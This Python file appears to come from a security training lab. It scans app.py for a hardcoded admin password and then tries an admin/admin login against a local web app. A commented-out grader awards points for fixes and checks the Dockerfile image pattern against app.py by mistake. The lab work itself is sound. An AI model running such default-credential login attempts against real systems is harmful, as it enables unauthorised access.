import re
import requests

# File path 
file_path = "app.py"

# Regular expression `
hardcoded_password_pattern = re.compile(r'ADMIN_PASSWORD\s*=\s*["\'].*["\']')

# Scan the file for hardcoded passwords
def detect_hardcoded_password(file_path):
    with open(file_path, 'r') as file:
        for line_number, line in enumerate(file, start=1):
            if hardcoded_password_pattern.search(line):
                print(f"Hardcoded password detected on line {line_number}: {line.strip()}")
                return True
    return False

# Exploit function to log in as admin with hardcoded credentials
def exploit_login():
    # URL of the login endpoint
    url = "http://127.0.0.1:5001/login"  

    # Hardcoded credentials found in app.py
    username = "admin"
    password = "admin"  # Exploiting the hardcoded admin password

    # Attempt to log in as admin
    response = requests.post(url, data={"username": username, "password": password})

    # Check response status
    if response.status_code == 200:
        print("Exploit successful! Logged in as admin.")
        print("Response content:", response.text)
    else:
        print("Exploit failed. Access denied.")

# Run detection and exploit only if a hardcoded password is found
if detect_hardcoded_password(file_path):
    print("Proceeding with exploit due to hardcoded password.")
    exploit_login()
else:
    print("No hardcoded password found. Exploit aborted.")

'''
import re
import requests

# File path for the script to check
file_path = "app.py"
# Points
points = 0

# Regular expressions for checking specific requirements
hardcoded_password_pattern = re.compile(r'ADMIN_PASSWORD\s*=\s*["\'].*["\']')
role_assignment_pattern = re.compile(r'role\s*=\s*["\']admin["\']\s*if\s*user\["is_admin"\]\s*else\s*["\']student["\']')
base_image_version_pattern = re.compile(r'FROM\s+[\w/]+:\s*1\.0\.1')

# Step 1: Detect if hardcoded ADMIN_PASSWORD is still in the file
def detect_hardcoded_password(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            if hardcoded_password_pattern.search(line):
                print("Hardcoded password still detected.")
                return True
    print("No hardcoded password found.")
    return False

# Step 2: Check for modified role assignment logic
def check_role_assignment(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
        if role_assignment_pattern.search(content):
            print("Role assignment logic is correct.")
            return True
    print("Role assignment logic is incorrect.")
    return False

# Step 3: Check for updated base image version in Dockerfile
def check_base_image_version(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
        if base_image_version_pattern.search(content):
            print("Base image version is correct.")
            return True
    print("Base image version is incorrect.")
    return False

# Exploit function to check if admin login is possible
def exploit_login():
    # URL of the login endpoint
    url = "http://127.0.0.1:5001/login"
    # Attempt to log in with default credentials
    username = "admin"
    password = "admin"
    response = requests.post(url, data={"username": username, "password": password})
    # Check if exploit is successful
    if response.status_code == 200:
        print("Exploit successful! Logged in as admin.")
        return True
    else:
        print("Exploit failed. Access denied.")
        return False

# Main grading function
def grade_script():
    global points

    # Step 1: Check if hardcoded password is removed
    if not detect_hardcoded_password(file_path):
        print("Step 1 complete. 10 points awarded.")
        points += 10
    else:
        print("Please redo Step 1.")

    # Step 2: Check role assignment and verify no exploit is detected
    if check_role_assignment(file_path):
        if not exploit_login():  # Ensures no exploit is successful
            print("Step 2 complete. 10 points awarded.")
            points += 10
        else:
            print("Exploit detected; please redo Step 2.")
    else:
        print("Please redo Step 2.")

    # Step 3: Check base image version
    if check_base_image_version(file_path):
        print("Step 3 complete. 10 points awarded.")
        points += 10
    else:
        print("Please redo Step 3.")

    print(f"Total Points: {points}")

# Run grading function
grade_script()
'''
